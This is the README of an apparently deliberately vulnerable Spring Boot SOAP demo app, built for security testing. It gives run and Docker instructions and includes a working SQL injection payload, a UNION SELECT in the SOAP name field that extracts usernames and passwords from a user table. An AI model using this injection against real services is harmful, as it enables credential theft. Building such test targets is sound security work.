# Spring boot SOAP example 

Simple SOAP API using Spring Boot. Based on this [tutorial](https://howtodoinjava.com/spring/spring-boot/spring-boot-soap-webservice-example/).

Requires:
* Gradle (wrapper in source)

## Run

```
./gradlew run
```

View the WDSL at http://localhost:9000/ws/vulnsoap.wsdl and post requests to http://localhost:9000/ws.

Example of a valid request (with header "Content-Type:text/xml"):
```
<s11:Envelope xmlns:s11='http://schemas.xmlsoap.org/soap/envelope/'>
  <s11:Body>
    <sch:GetCourseDetailsRequest xmlns:sch='http://www.stackhawk.com/vulnsoap'>
        <sch:name>history</sch:name>
    </sch:GetCourseDetailsRequest>
  </s11:Body>
</s11:Envelope>
```

## Vulnerability

Example of a SQL injection request:

```
<s11:Envelope xmlns:s11='http://schemas.xmlsoap.org/soap/envelope/'>
  <s11:Body>
    <sch:GetCourseDetailsRequest xmlns:sch='http://www.stackhawk.com/vulnsoap'>
        <sch:name>history' union select id, username as name, password as description from user --</sch:name>
    </sch:GetCourseDetailsRequest>
  </s11:Body>
</s11:Envelope>
```

### Docker

```
# build install distribution
./gradlew installDist

# build image
docker build -t local/spring-boot-soap-example .

# run image
docker run -p 8080:8080 local/spring-boot-soap-example
```